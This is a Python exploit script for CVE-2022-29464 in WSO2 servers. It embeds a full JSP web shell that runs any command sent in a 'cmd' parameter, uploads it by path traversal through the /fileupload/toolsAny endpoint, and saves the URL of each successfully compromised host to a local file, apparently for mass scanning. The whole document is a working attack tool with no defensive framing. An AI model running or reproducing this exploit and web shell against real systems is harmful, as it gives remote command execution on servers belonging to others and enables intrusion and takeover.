import requests
shell= '''<%@ page import="java.util.*,java.io.*"%>
<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>'''
public_key = '''KEY'''
def CVE_2022_29464_exp(url):
    try:
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira": public_key})
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            print(f"【！！！！！！】存在CVE_2022_29464漏洞，shell地址为：{url}/authenticationendpoint/capoeira.jsp\n")
            with open("存在WSO2远程命令执行漏洞的url.txt","a+") as f:
                f.write(url + "/authenticationendpoint/capoeira.jsp\n")
            f.close()
        else:
            print("【×】不存在CVE_2022_29464漏洞:" + url + "\n")
    except Exception as e:
        pass